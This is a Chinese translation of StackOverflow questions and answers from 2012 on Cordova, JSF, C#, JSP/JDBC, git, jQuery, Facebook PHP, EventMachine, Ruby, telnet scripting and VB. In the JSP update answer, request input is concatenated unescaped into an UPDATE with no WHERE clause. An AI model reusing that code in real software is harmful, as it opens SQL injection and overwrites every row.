# StackOverflow 问答 12264000-12264999

# networking - Sencha Touch with PhoneGap - 如何在 WI-FI 上确定 IP 地址

> ID：12264001
> 
> 赞同：0
> 
> 时间：2012-09-04T12:59:16.610
> 
> 标签：networking, cordova, ip, wifi, sencha-touch-2

我正在`Sencha Touch 2`使用`PhoneGap`. 连接到 Wi-Fi 网络时，我需要确定我的设备 IP 地址。有什么办法吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:43:18.183

您需要创建一个插件来读取设备的 IP 地址。这是我写的一个教程，涵盖了如何为 Cordova 2.0.0 编写一个 Android 插件，示例是获取 IP 地址。

[http://simonmacdonald.blogspot.com/2012/08/so-you-wanna-write-phonegap-200-android.html](http://simonmacdonald.blogspot.com/2012/08/so-you-wanna-write-phonegap-200-android.html)

# primefaces - p:graphicImage 正在 Myface CODI 中打开一个新的 WindowId

> ID：12264003
> 
> 赞同：0
> 
> 时间：2012-09-04T12:59:27.127
> 
> 标签：primefaces, codi

我看到我的表单中的 primeface p:graphicImage 导致在同一个浏览器选项卡中创建一个新的 windowId 。

我所有的 bean 都是窗口范围的。Myface CODI 的@WindowScoped。

由于我的业务逻辑与初始登录相关联，因此环境变量与 windowContext 相关联。

当 p:graphicImage 尝试使用新的 windowId/windowContext 访问 bean 时，应用程序将失败。

有没有办法避免这种情况？

这是我的视图文件

```
 <h:form enctype="multipart/form-data">
            <p:messages />
            <p:panelGrid style="width:75%;margin:5px auto;">
                <f:facet name="header">
                    <p:row>
                        <p:column colspan="3">
                            <h:outputText value="#{title.update}" />
                        </p:column>
                    </p:row>
                </f:facet>
                <p:row>
                    <p:column>
                        <p:graphicImage alt="Your Photograph" id="photo" value="#{employeeUpdateBean.photoStream}" width="80" height="80" />
                    </p:column>
                    <p:column colspan="2">
                        <p:fileUpload mode="advanced"
                            fileUploadListener="#{employeeUpdateBean.addPhotoFile}"
                            allowTypes="/(\.|\/)(gif|jpe?g)$/" sizeLimit="100000"
                            invalidSizeMessage="Please limit photo size to 100Kb"
                            />
                    </p:column>
                </p:row>
                    <f:facet name="footer">
                    <p:row>
                        <p:column colspan="3">
                            <p:commandButton value="Update" action="#{employeeUpdateBean.employeeUpdate}" ajax="false"
                                style="margin-left:5px;margin-right:5px;" />
                        </p:column>
                    </p:row>
                </f:facet>
            </p:panelGrid>
    </h:form> 
```

这是我的豆子的一部分

```
@Named
@WindowScoped
public class EmployeeUpdateBean implements Serializable{

static final long serialVersionUID = 7l;
private static final Log log = LogFactory.getLog(EmployeeUpdateBean.class);

@Inject
private HibernateUtil hibernateUtil;

@Inject
securityHelper secHelper;

@Inject
WindowContext windowContext;

public EmployeeUpdateBean() {
}

@PostConstruct
public void getData() {
    System.out.println("In Get Data");
    System.out.println("windowId: "+this.windowContext.getId());
    //Thread.dumpStack();
    Integer id= secHelper.getEmployeeId();
    System.out.println("ID"+id);
} 
```

下面是我看到的输出。

```
In Get Data
windowId: f75
ID11117
In Get Data
windowId: f75
ID11117
In Get Data
windowId: 1f9
IDnull 
```

前两个“in Get Data”与对 getData 的 preRenderView 调用（此处代码中未显示）和 PostContruct 调用有关。

第三个显然是在 p:graphicImage 尝试使用新的 windowId 访问 photoStream 时创建新的 bean 实例时对 @PostConstruct 的调用。

我已通过从表单中删除 p:graphicImage 来尝试此操作，在这种情况下，永远不会进行第三次调用。

我必须使用 p:graphicImage 因为我需要从数据库中传输数据。而且我试图避免编写单独的 servlet 来流式传输图像。

此外，单独的 servlet 不是一个好的选择，因为我需要知道登录的员工才能显示图像。

请让我知道是否有任何好的解决方案来克服这个问题。

我的完整环境是 Tomcat 7 Openwebbeans Myfaces CODI Myfaces + Primefaces

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T15:13:01.207

在stackoverflow中有很多关于使用`p:graphicImage`从数据库渲染图像的问题。为了使其工作，bean必须是@RequestScoped或@SessionScoped。我认为它不适用于 CODI 的特殊范围。

我建议您为此使用 servlet。如果您需要知道登录的员工，您可以将该信息放入会话映射中，然后从服务器读取。

以下解释来自 primefaces 用户指南：

> 动态图像显示的工作方式如下：
> • 动态图像将其值表达式字符串放入具有唯一键的 http 会话中。
> • 唯一会话密钥附加到指向 JSF 资源处理程序的图像 url。
> • 自定义PrimeFaces ResourceHandler 从url 获取键，检索表达式字符串，如#{bean.streamedContentValue}，评估它以从bean 获取StreamedContent 实例并将内容流式传输到客户端。
> 
> 结果将有 2 个请求显示图像，第一个浏览器将发出加载页面的请求，然后另一个请求指向指向 JSF 资源处理程序的动态图像 url。请注意，您不能使用 viewscope bean，因为 viewscoped bean 在资源加载请求中不可用。

# objective-c - 只有字典的最后一个元素被添加到核心数据中

> ID：12264004
> 
> 赞同：0
> 
> 时间：2012-09-04T12:59:32.983
> 
> 标签：objective-c, core-data, nsdictionary

我有一本字典，我正在尝试将其所有数据加载到核心数据中。
但是，它只将最后一个元素插入到 Core Data 中。

```
NSArray *NameArray = [resultsDictionary objectForKey:@"Sections"];
for (NSDictionary *Dictionary in NameArray) {

    [section setValue:[Dictionary objectForKey:@"Name"] forKey:@"name"];

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:17:12.647

您在每次迭代中覆盖“名称”键的值。这就是为什么只有最后一个被保存。您应该为每个字典项插入一个新对象或更新现有对象。

```
NSArray *NameArray = [resultsDictionary objectForKey:@"Sections"];
for (NSDictionary *Dictionary in NameArray) {
    Section *newSection = <#create new object or fetch existing one#>
    [newSection setValue:[Dictionary objectForKey:@"Name"] forKey:@"name"];
} 
```

# c# - 从 C# 桌面应用程序中的 HttpWebResponse 获取 JSESSIONID

> ID：12264007
> 
> 赞同：0
> 
> 时间：2012-09-04T12:59:44.223
> 
> 标签：c#, httpwebresponse, jsessionid

我使用 MSDN 示例创建了这个示例。

```
HttpWebRequest request = (HttpWebRequest)WebRequest.Create(redirUri);
request.Method = "GET";
request.CookieContainer = new CookieContainer();
Trace.WriteLine("Created request to " + redirUri);
HttpWebResponse response = (HttpWebResponse)request.GetResponse();

// Right here I want to get JSESSIONID, but Cookies are empty

foreach (Cookie cook in response.Cookies)
{
   Debug.WriteLine("{0} = {1}", cook.Name, cook.Value);
} 
```

无法获取 JSESSIONID。我需要在一个会话中进行多个 GET/POST 查询，这就是我需要 JSESSIONID 的原因。请帮帮我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-04T14:23:13.643

```
string cookieHeaderValue = ((System.Net.HttpWebResponse)response).Headers["Set-Cookie"].Split(new char[]{';'})[0].Trim(); 
```

# c# - 嵌套开关？或其他解决方案检查不同的条件？

> ID：12264008
> 
> 赞同：4
> 
> 时间：2012-09-04T12:59:47.050
> 
> 标签：c#, if-statement, coding-style, switch-statement, case-statement

好的，情况如下：

我有一个具有 2 个设置的客户端：ConnectionState 和 ConnectionSollState，它们都是相同的可枚举（TypeConnectionState），它们存储客户端连接的实际状态和连接应该是的状态。在 to 的每种组合上，都应该发生不同的事情，例如 ConnectionState 为“Connected”但 ConnectionSollState 为“Closed”-> 拆除客户端。所以我有 4 种可能性需要检查。现在每个客户端都可以处理无限数量的会话，并且每个会话也有一个状态（StreamState & StreamSollState），这些状态可以有 6 个可枚举的选项。

从现在开始，我做了大约 20 个开关条件，我的代码看起来非常混乱，我在编码时每 5 分钟就会做错事。有没有更简单的方法来处理这种情况？（如果/否则）会使事情变得更糟。

例子：

```
private void RTSPWorker() {
    try {
        byte[] buffer = new byte[2048];
        while (!mb_RTSPWorkerAbbort) {
        // Call TransportWD
            Thread.Sleep(100 * mi_ConnectionTimeOut);

            // Check ConnectionSollState
            switch(ConnectionSollState) {
                case TypeConnectionState.Connected:
                    // ConnectionSollState = Connected, check ConnectionState
                    switch(ConnectionState) {
                        case TypeConnectionState.Connected:
                            // ConnectionState is connected, keep-alive!
                            if(GET_PARAMETER() == null) {
                                DESCRIBE();
                            }
                            // Check streams too
                            foreach (cRTSPStream oStream in mo_StreamDict.Values) {
                                // Check StreamSollState
                                switch(oStream.RTSPStreamSollState) {
                                    case cRTSPStream.TypeRTSPStreamState.Play:
                                        // SollState is PLAY, check State
                                        switch(oStream.RTSPStreamState) {
                                            case cRTSPStream.TypeRTSPStreamState.Play:
                                                //Stream is alive, keep-alive!
                                                if (oStream.PLAY() == null) { oStream.DESCRIBE(); } break;
                                            case cRTSPStream.TypeRTSPStreamState.Closed:
                                                // Reinitialise.
                                                if (oStream.SETUP() != null) { oStream.PLAY(); } break;
                                            default:
                                                // Default, send play.
                                                oStream.PLAY(); break;
                                        }
                                    break;
                                case cRTSPStream.TypeRTSPStreamState.Pause:
                                    // SollState is on pause, check State
                                    switch(oStream.RTSPStreamState) {
                                        case cRTSPStream.TypeRTSPStreamState.Closed:
                                            // Reinitialise.
                                            if (oStream.SETUP() != null) { oStream.PLAY(); } break;
                                        default:
                                            oStream.PAUSE();
                                            break;
                                    }
                                break;
                                case cRTSPStream.TypeRTSPStreamState.Closed:
                                    // SollState is closed, check State
                                    switch(oStream.RTSPStreamState) {
                                        case cRTSPStream.TypeRTSPStreamState.Closed:
                                            // Is closed, do nothing
                                            break;
                                        default:
                                            // Default teardown, remove session
                                            oStream.TEARDOWN();
                                            this.RemoveRTSPSession(oStream);
                                            break;
                                        }
                                default:
                                    // Default, what do?
                                    break;
                                }
                            }
                            break;
                        case TypeConnectionState.Closed:
                            // ConnectionState should be connected, re-connect!
                                while(Connect() != true) {
                                    // Sleep for 200ms, try again
                                    Thread.Sleep(200);
                                }
                            break;
                        default:
                            // TODO anything else
                            break;
                    }
                    break;
                case TypeConnectionState.Closed:
                    // Check ConnectionState
                    switch(ConnectionState) {
                        case TypeConnectionState.Connected:
                            // Is connected, should be closed. Close connection & clean up!
                            Close(null);
                            break;
                        default:
                            // Anything other than Connected, do nothing.
                            break;
                    }
                    break;

                default:
                    break;
            }
        }
    } catch {

    }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-04T13:16:51.380

天哪，蝙蝠侠，那是你那里的一些难以理解的代码。这里有一些提示可能会改善您的情况。我必须补充一点，这些提示有些偏颇，因为它们更喜欢个人编码风格：

1.  **将 switch 语句重写为 IF 语句**。嵌套的 IF 语句比嵌套的 switch 语句更容易阅读，即使您必须编写更多代码才能获得相同的结果。
2.  **将您的方法分解为几个子方法**。你的方法*可能是*试图同时做太多的事情。->[关注点分离](http://en.wikipedia.org/wiki/Separation_of_concerns)和[单一责任原则](http://en.wikipedia.org/wiki/Single_responsibility_principle)
3.  **使用改进的真值表**。在您有基于变量组合产生某些结果的逻辑的情况下，您可能需要使用真值表结构。例如，使用`List<Tuple<T1,T2,T etc..>>`构造。

前任：

```
var truthTable = List<Tuple<NavigationTab, Role, Action>>
{
    new Tuple<NavigationTab, Role, Action>(NavigationTab.Users, Role.UsersAdministration, MVC.Administration.Users.Index()),
    new Tuple<NavigationTab, Role, Action>(NavigationTab.Users, Role.RolesAdministration, MVC.Administration.Roles.Index()),
    new Tuple<NavigationTab, Role, Action>(NavigationTab.Products, Role.ProductsAdministration, MVC.Administration.Products.Index()),
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:18:38.767

更好的面向对象通常被认为是 switch 语句的最佳替代方案。例如，您可以使用多态性而不是 switch 语句并执行以下操作：

```
try {
    byte[] buffer = new byte[2048];
    while (!mb_RTSPWorkerAbbort) {
        Thread.Sleep(100 * mi_ConnectionTimeOut);
        worker.DoWork();
    }
 } catch (Exception ex) {
     Trace.WriteLine(ex);
 } 
```

随着状态的变化，您可以实例化实现不同的不同类型的工作程序类`DoWork`。一种可能是：

```
while(Connect() != true) {
    // Sleep for 200ms, try again
    Thread.Sleep(200);
} 
```

当然，我不一定认为你应该这样做。我唯一需要做的就是你发布的代码——所以，可能*有更好*的方法来实现不同的行为。

[这与规范模式](http://en.wikipedia.org/wiki/Specification_pattern)非常相似。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T14:03:07.393

将您的代码分解成更小、更易于管理的部分。

如果您提取案例语句中的逻辑，则可以完全重写主循环而无需切换，例如：

```
while (!mb_RTSPWorkerAbbort)
{
    // Call TransportWD
    Thread.Sleep(100*mi_ConnectionTimeOut);

    if (ConnectionSollState == TypeConnectionState.Closed)
    {
        CloseIfConnected();
    }

    if (ConnectionSollState == TypeConnectionState.Connected)
    {
        if (ConnectionState == TypeConnectionState.Connected)
        {
            KeepAlive();
            ProcessStreams(); // <--bad example name - rename to what it's actually doing.
        }
        else
        {
            Reconnect();
        }
    }
} 
```

当你在一个月后看到这个时（或者在你需要审查的情况下），你会更容易看到发生了什么。

# java - 编辑和更新同一个文本框

> ID：12264011
> 
> 赞同：1
> 
> 时间：2012-09-04T12:59:51.110
> 
> 标签：java, jsp, jdbc

我有一个数据库表，我可以在其中编辑一个值。我想更新相同的，下面是我尝试过的代码。

表格代码如下

```
<table border="1px">
    <tr>
        <td><b>DBID</b></td>
        <td><b>Query Raised</b></td>
        <td><b>Time Raised</b></td>
        <td><b>Query Answered</b></td>
        <td><b>Time Answered</b></td>
    </tr>
<%
try {
    ps = con.prepareStatement("Select DBID, Query_Raised, TR, Query_Answered, TA from Scope1 where TR!='null'");

    rs = ps.executeQuery();

    while(rs.next()) {
%>
    <tr>
        <td><%=rs.getString("DBID")%></td>
        <td><input type="Text" value="<%=rs.getString("Query_Raised")%>" name="Updat"></td>
        <td><%=rs.getString("TR")%> </td>
        <td><%=rs.getString("Query_Answered")%></td>
        <td><%=rs.getString("TA")%></td>
        <td><input type="Submit" value="Update"></td>
    </tr>
<%
    } // while loop ends here

    rs.close();
    con.close();
} catch(Exception e) {
    out.println(e);
}
%>
</table> 
```

并且使用的更新查询是：

```
String a = request.getParameter("Updat");

ps = con.prepareStatement("Update Scope1 Set Query_Raised = '" + a + "'");

int i = ps.executeUpdate();

if(i == 1) {
    out.print("Done");
} else{
    out.print("Erro");
} 
```

我想知道我应该使用什么条件来更新同一页面中的数据。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T15:39:34.990

我知道问题中的第一部分代码是 JSP `update.jsp`，第二部分似乎是你的 servlet，比如`UpdateServlet`.

所以在`update.jsp`每一行你都有一个`<input type="text">`and`submit`按钮，但`<form>`我认为只有一个必须在 之外`<table>`，所以这是我的解决方案（选择任何一个）：

1.  为每一行使用多个`<form>`标签，例如

    ```
    <form action="whatever_action_you_have_which_calls_the_servlet"
          name="form<%=rs.getString("DBID")%>"
          id="formID<%=rs.getString("DBID")%>">
       // Including name and id so that the different forms remain unique
        <tr>
            <td><%=rs.getString("DBID")%></td>
            <td><input type="Text" value="<%=rs.getString("Query_Raised")%>" name="Updat"></td>
            <td><%=rs.getString("TR")%> </td>
            <td><%=rs.getString("Query_Answered")%></td>
            <td><%=rs.getString("TA")%></td>
            <td><input type="Submit" value="Update"></td>
        </tr>
    </form> 
    ```

    因此，当您单击提交时，它将提交单击按钮的内容，并且仅提交已编辑的`<form>`内容，瞧！您的 servlet 代码也可以正常工作。`submit``input`

2.  您可以在同一个 JSP 中拥有两个代码块，然后使用`<form>`第 1 点中描述的代码片段，第二个代码片段将是：

    ```
    String a = request.getParameter("Updat");

    if ( (a is not empty) or (a is not null)  ) {
        ps = con.prepareStatement("Update Scope1 Set Query_Raised = '" + a + "'");

        int i = ps.executeUpdate();

        if(i == 1) {
            out.print("Done");
        } else{
            out.print("Error");
        }
    }

    ...

    <form action="whatever_action_you_have_which_will_call_this_JSP" ...>
        <tr> ... your code as in point#1
        </tr>
    </form> 
    ```

3.  正如[Endy](https://stackoverflow.com/a/12264097/468763 "恩迪对这个问题的回答")所说，使用 ajax 和其他 javascript DOM 操作方法来完成此操作。
    为此，您将需要 JSP（显示）和 Servlet（更新代码）。
    这可能需要更多的努力，但您将学习 Ajax，并且会更接近现实世界。
    到目前为止， [jQuery ajax](http://api.jquery.com/jQuery.post/ "jQuery ajax 文档")是最简单易用的。

**注意：**
仅作记录，我知道您可能正在练习，但如果您打算在实际项目中使用它，请提前阅读。

在 JSP 中使用 scriptlet是一种***不好的做法***（除非确实需要，而且如果它用于视图级逻辑而不是业务或数据级逻辑），更***糟糕***的是在 JSP 中使用`JDBC`代码。因此，如果您能听从 f_puras 的[建议](https://stackoverflow.com/questions/12264011/edit-and-update-same-textbox#comment16443490_12264011 "f_puras 对这个问题的评论")，那就太好了。

如果你想知道我为什么要听你不请自来的建议，那么这里有一些值得深思的地方：

*   [如何避免 JSP 中的 scriptlet](https://stackoverflow.com/a/3180202/468763 "堆栈溢出对这个主题的回答")
*   [无脚本 JSP](http://www.javaranch.com/journal/200603/Journal200603.jsp#a5 "关于这个问题的一篇好文章")
*   [为什么 JSP = JDBC 不好](http://www.dzone.com/links/r/why_jdbc_jsp_bad.html "为什么 JDBC = JSP 不好")

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:05:17.663

您可以使用 AJAX 将数据发布到处理更新的页面，然后将结果作为回调返回，请参阅[http://api.jquery.com/jQuery.post/](http://api.jquery.com/jQuery.post/)。

其他解决方案是在处理提交后将用户转发回带有表单的页面。

第三种解决方案是将数据提交到同一页面并在那里解析/更新。

# git - 如何在不检查的情况下判断 git 子模块应该在哪个提交、标记和分支上

> ID：12264022
> 
> 赞同：1
> 
> 时间：2012-09-04T13:00:23.367
> 
> 标签：git, git-submodules

我在 git 中有一个项目。它有几个子模块。在不进入子模块并执行 git status 或类似操作的情况下，有没有办法告诉主项目认为它应该在哪个提交、分支和标记上？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:08:45.800

该命令`git submodule modulename`在不进入子模块目录的情况下为您提供提交，然后是 的结果[`git describe`](http://git-scm.com/docs/git-describe)，它为您提供最新的标签：

```
$ git submodule ext/fiji
808e757481874dfd493b8cc08a484235ce807ec2 ext/fiji (Fiji-Madison-23-g808e757) 
```

对于分支，您必须`cd`在目录中，或者`$GITDIR`在运行之前更改`git status`。

# javascript - 使用 Jquery 查找特定类的上一个 div

> ID：12264025
> 
> 赞同：0
> 
> 时间：2012-09-04T13:00:26.447
> 
> 标签：javascript, jquery

我使用 jquery，我想找到前一个具有“错误”类的 div

我的html代码：

```
<table class="questions">
    <tr>
        <td class="heading">1
            <div class="error"></div>
        </td>

        <td colspan="4">
            <textarea class="textcontrol required" name='questionT136'>
            </textarea>
        </td>
    </tr>

    <tr>
        <td></td>

        <th><label for="reponse137-3">Très satisfaisant</label></th>
        <th><label for="reponse137-4">Satisfaisant</label></th>
        <th><label for="reponse137-5">Insatisfaisant</label></th>
    </tr>

    <tr class="q">
        <td class="heading">
            2
            <div class="error"></div>
        </td>

        <td class="questionradio"><input class="required" id='reponse137-3'
        name='questionN137' type='radio' value='3'></td>

        <td class="questionradio"><input class="required" id='reponse137-4'
        name='questionN137' type='radio' value='4'></td>
    </tr>
</table> 
```

例如，从*reponse137-3 开始*，我想将值更改为以前的 class="error"。我已经尝试通过以下方式访问该对象：

```
$('#reponse137-3').prev(".error") 
```

但它不起作用。我认为因为它没有同一个父母，所以我尝试了：

```
$('#reponse137-3').prev("tr").next(".error") 
```

我能怎么做 ？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T13:04:43.117

假设您的`.error`div 始终在同一表行中：

```
$('#reponse137-3').closest('tr').find('.error:first'); 
```

[http://jsfiddle.net/vkfF8/](http://jsfiddle.net/vkfF8/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T13:11:31.457

你需要上三下才能到达餐桌，后来发现错误

```
$('#reponse137-3').parent().parent().parent().find('.error'); 
```

第一个父母去 th，第二个去 tr 和 thirth 到 table，然后在 table 中找到哪个元素的类名为 .error 你会得到它

# c# - 允许在 int 文本框中使用不可为空的 int 为空

> ID：12264026
> 
> 赞同：0
> 
> 时间：2012-09-04T13:00:33.147
> 
> 标签：c#, wpf

因此，对此有非常相似的问题，但似乎没有一个可以解决我正在尝试做的事情，也许这是不可能的。我有一个表单，其中有许多文本框绑定到我的模型中的 int 属性。我们允许用户清除该字段，并且它应该保持清除状态。目前，如果他们这样做，他们会收到无法转换“”的验证错误。但是，我理解为什么这是由于我不能使用 int? 的设计，我知道这可以解决我的问题。是否可以这样做，而不必定义要绑定的字符串属性？我试图不将我的所有 int 属性复制为字符串属性，但也许这就是我需要走的路。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:06:33.380

当字符串为空时你想做什么？我的意思是如果文本框为空，你想在 prop 中有一些 int 值吗？如果是，只需创建一个[转换器](http://msdn.microsoft.com/en-us/library/system.windows.data.ivalueconverter.aspx)，将 null 值转换为该值并分配给 Binding

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T13:06:13.223

您需要能够表示一个空的 int。这是一个肮脏的黑客，但如果你选择了一个永远不会有效的数字，比如 -999，你可以使用自定义转换器在“”和 -999 之间进行转换和转换。

它可能会达到你想要的，但我不推荐它。

# php - Facebook API 致命错误错误：（未捕获的 OAuthException：验证应用程序时出错）

> ID：12264029
> 
> 赞同：0
> 
> 时间：2012-09-04T13:00:46.240
> 
> 标签：php, facebook, api, facebook-graph-api

我是 Facebook API 的初学者。我刚刚创建了一个应用程序，我想显示朋友的姓名和数量：

这是我的代码：

```
<?php

require_once 'facebook-php-sdk/src/facebook.php';

$appapikey = '133XXXX60164049';
$appsecret = '  ce6a47dfd838WWWWWW34f387b28633660';

$facebook = new Facebook($appapikey, $appsecret);

$user_id = $facebook->getUser();

$friends = $facebook->api('/me/friends');

echo "<p>Hello <fb:name uid=\"$user_id\" useyou=\"false\" linked=\"false\" firstnameonly=\"true\"></fb:name>, you have ".count($friends)." friends";

foreach($friends as $friend){
     $infos.=$friend.",";
}

$infos = substr($infos,0,strlen($infos)-1);

$gender=$facebook->api_client->users_getInfo($infos,'sex');

$gender_array = array(); 

foreach($gender as $gendervalue){
     $gender_array[$gendervalue[sex]]++;
}

$male = round($gender_array[male]*100/($gender_array[male]+$gender_array[female]),2);
$female = 100-$male;

echo "<ul><li>Males: $male%</li><li>Females: $female%</li></ul>";

?> 
```

我懂了

> 致命错误：未捕获的 OAuthException：验证应用程序时出错。由于系统错误，无法获取应用程序信息。在第 1238 行的 D:\softs\UwAmp\www\facebook-php-sdk\src\base_facebook.php 中抛出

* * *

我试图只显示这样的用户名：

```
<?php

require_once 'facebook-php-sdk/src/facebook.php';

$appapikey = '453976ergerger647366';
$appsecret = 'fexxxxxxxxeb39bbce717b8062';

$facebook = new Facebook($appapikey, $appsecret);

$user_id = $facebook->getUser();

echo "<p>Hello <fb:name uid=\"$user_id\" useyou=\"false\" linked=\"false\" firstnameonly=\"true\"></fb:name>";
 ?> 
```

但它不起作用。只有“你好”出现：s

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:31:05.400

我认为您的问题在该`foreach($friends as $friend)`部分中。

如果我是正确的，它会返回带有数组的 {data}。所以你需要说

```
foreach(friends['data'] as $friend) 
```

也许做一些评论，看看错误在哪里，然后`print_r($friends)`看看数组的样子！

# ruby - EventMachine 与 em-synchrony 我需要正确限制我的 http 请求

> ID：12264036
> 
> 赞同：1
> 
> 时间：2012-09-04T13:01:10.190
> 
> 标签：ruby, http, asynchronous, eventmachine, fibers

我有一个消费者通过事件订阅从队列中提取消息。它接收这些消息，然后连接到一个相当慢的 http 接口。我有一个 8 个工作池，一旦这些都被填满，我需要停止从队列中拉取请求，并让正在处理 http 作业的纤程继续工作。这是我整理的一个例子。

```
def send_request(callback)
  EM.synchrony do

    while $available <= 0

      sleep 2 

      puts "sleeping"
    end 
    url = 'http://example.com/api/Restaurant/11111/images/?image%5Bremote_url%5D=https%3A%2F%2Firs2.4sqi.net%2Fimg%2Fgeneral%2Foriginal%2F8NMM4yhwsLfxF-wgW0GA8IJRJO8pY4qbmCXuOPEsUTU.jpg&image%5Bsource_type_enum%5D=3'
    result = EM::Synchrony.sync EventMachine::HttpRequest.new(url, :inactivity_timeout => 0).send("apost", :head => {:Accept => 'services.v1'})

    callback.call(result.response) 
  end 
end

def display(value)
  $available += 1
  puts value.inspect
end

$available = 8 

EM.run do
  EM.add_periodic_timer(0.001) do
    $available -= 1
    puts "Available: #{$available}"

    puts "Tick ..." 
    puts send_request(method(:display))
  end 

end 
```

我发现如果我在同步块中的一个while循环内调用睡眠，反应器循环就会卡住。如果我在 if 语句中调用 sleep （只睡一次），那么大多数情况下请求完成的时间是足够的，但充其量是不可靠的。如果我使用 EM::Synchrony.sleep，那么主反应器循环将继续创建新请求。

有没有办法暂停主循环但让纤维完成它们的执行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T07:57:54.223

```
sleep 2 
```

...

```
add_periodic_timer(0.001) 
```

你是认真的？

你有没有想过有多少人`send_request`在循环中睡觉？它每秒增加 1000 个。

那这个呢：

```
require 'eventmachine'
require 'em-http'
require 'fiber'

class Worker
  URL = 'http://example.com/api/whatever'

  def initialize callback
    @callback = callback
  end

  def work
    f = Fiber.current
    loop do
      http = EventMachine::HttpRequest.new(URL).get :timeout => 20

      http.callback do
        @callback.call http.response
        f.resume
      end
      http.errback do
        f.resume
      end

      Fiber.yield
    end
  end
end

def display(value)
  puts "Done: #{value.size}"
end

EventMachine.run do
  8.times do
    Fiber.new do
      Worker.new(method(:display)).work
    end.resume
  end
end 
```

# ruby - Float#to_d 在哪里？

> ID：12264042
> 
> 赞同：9
> 
> 时间：2012-09-04T13:01:42.530
> 
> 标签：ruby

有时我看到代码使用`to_d`. ruby 文档甚至声明[有一种`Float#to_d`方法](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/bigdecimal/rdoc/Float.html)。但是，它不在我的 ruby​​ ( `ruby 1.9.3p263 (2012-08-23 revision 36792`) 版本中。

```
1.9.3p263 :001 > "0.0".to_d
NoMethodError: undefined method `to_d' for "0.0":String
    from (irb):1
    from /home/iblue/.rvm/rubies/ruby-1.9.3-head/bin/irb:16:in `<main>'
1.9.3p263 :002 > 0.0.to_d
NoMethodError: undefined method `to_d' for 0.0:Float
    from (irb):2
    from /home/iblue/.rvm/rubies/ruby-1.9.3-head/bin/irb:16:in `<main>'
1.9.3p263 :003 > 0.to_d
NoMethodError: undefined method `to_d' for 0:Fixnum
    from (irb):3
    from /home/iblue/.rvm/rubies/ruby-1.9.3-head/bin/irb:16:in `<main>' 
```

没有`to_d`，或。`Float`_ 这是怎么回事？`String``Fixnum`

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-04T13:04:18.587

如您需要[的文档示例中所述](http://www.ruby-doc.org/stdlib-1.9.3/libdoc/bigdecimal/rdoc/Float.html)

```
require 'bigdecimal'
require 'bigdecimal/util' 
```

# shell - 在 shell 脚本中进行 Telnet

> ID：12264044
> 
> 赞同：6
> 
> 时间：2012-09-04T13:01:47.963
> 
> 标签：shell, unix, telnet

如何在 shell 脚本中运行 telnet 并在远程服务器上执行命令？

由于安全原因，我没有在我的 Solaris 机器上安装 expect。我也没有`net::telnet`安装 perl 模块。

那么如果不使用 expect 和 perl 我该怎么做呢？

我尝试了下面的事情，但它不起作用。

```
#!/usr/bin/sh
telnet 172.16.69.116 <<!
user
password
ls
exit
! 
```

当我执行它时，这就是我得到的：

```
> cat tel.sh
telnet 172.16.69.116 <<EOF
xxxxxx
xxxxxxxxx
ls
exit
EOF
> tel.sh
Trying 172.16.69.116...
Connected to 172.16.69.116.
Escape character is '^]'.
Connection to 172.16.69.116 closed by foreign host.
> 
```

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-04T13:11:57.133

您的某些命令可能会被丢弃。您可以使用普通脚本结构实现更精细的控制，然后通过带有`echo`. 将命令列表分组以创建一个“会话”：-

```
{
sleep 5
echo user
sleep 3
echo password
sleep 3
echo ls
sleep 5
echo exit
} | telnet 172.16.65.209 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2017-07-20T21:54:04.037

我遇到了同样的问题……但是，至少在我的环境中，结果证明目标服务器上的 SSL 证书以某种方式损坏，服务器团队解决了这个问题。

现在，我要做的是弄清楚如何让脚本运行你在上面做的完全相同的事情，除了我希望它把上面完全相同的场景转储到一个文件中，然后当它遇到一个它实际连接的服务器，我希望它提供转义字符（^]）并继续到下一个服务器。

# vb.net - 在VB中格式化整数

> ID：12264049
> 
> 赞同：1
> 
> 时间：2012-09-04T13:02:19.573
> 
> 标签：vb.net

如何将整数格式化`5500000.00`为类似的格式`5,50 Mil.`？

我如何转换或格式化它？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:06:32.617

是的。

您可能没有意识到整数和显示（在这种情况下可能是十进制）值之间的区别。`5500000`是字符串。如果将其转换为整数，它会以`00000000 01010011 11101100 01100000`（以位为单位）存储在内存中的某处。

显示值 ,`5500000`都是`55.0 Mil`字符串。计算机不知道那`5500000`是数字 - 它只能将文本解析为数字表示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T13:07:58.293

是的，您需要将其转换为字符串才能以这种方式显示，但您不必将其转换为字符串即可实际获得数百万的数字。例如：

```
Dim total As Integer = 5500000
Dim millions As Decimal = total / 1000000
Dim formatted As String = String.Format("{0} Mil.", millions) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T13:10:14.833

```
Dim value As Integer = 5500000
Dim valueInMil As Single = (CType(value,Single) / 1000000) 
```

# zeromq - ZeroMQ 中的 N 到 N 异步模式？

> ID：12264056
> 
> 赞同：8
> 
> 时间：2012-09-04T13:02:41.353
> 
> 标签：zeromq

尽管我浏览了该指南，但我找不到执行以下操作的方法：
我们有 n 个发布者，
我们有 m 个订阅者。
每个订阅者订阅某种类型的消息（一个发布者可以发送多种消息，多个发布者可以发出相同类型的消息）。
